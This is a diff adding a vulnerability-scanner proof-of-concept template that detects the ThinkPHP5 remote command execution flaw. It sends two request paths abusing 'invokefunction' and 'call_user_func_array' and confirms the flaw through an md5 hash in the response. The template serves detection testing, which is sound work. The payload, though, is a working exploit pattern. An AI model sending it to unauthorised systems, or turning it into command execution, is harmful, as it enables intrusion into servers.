@@ -1,0 +1,21 @@
+id: poc-yaml-thinkphp5-remote-command-execution
+info:
+  name: ThinkPHP5 Remote Command Execution
+  severity: critical
+  tags:
+  - rce
+  finger: thinkphp,thinkphp5
+  osprey-id: vb_2019_0071
+variables:
+  r_payloads: '/?s=index/\think\app/invokefunction&function=call_user_func_array&vars[0]=md5&vars[1][]=31337
+
+    /?s=admin/\think\app/invokefunction&function=call_user_func_array&vars[0]=md5&vars[1][]=31337
+
+    '
+requests:
+- method: GET
+  path: '{{.r_payloads}}'
+  headers: {}
+  data: null
+  expression: status_code == 200 && contains(body, "6f3249aa304055d63828af3bfab778f6")
+transport: http
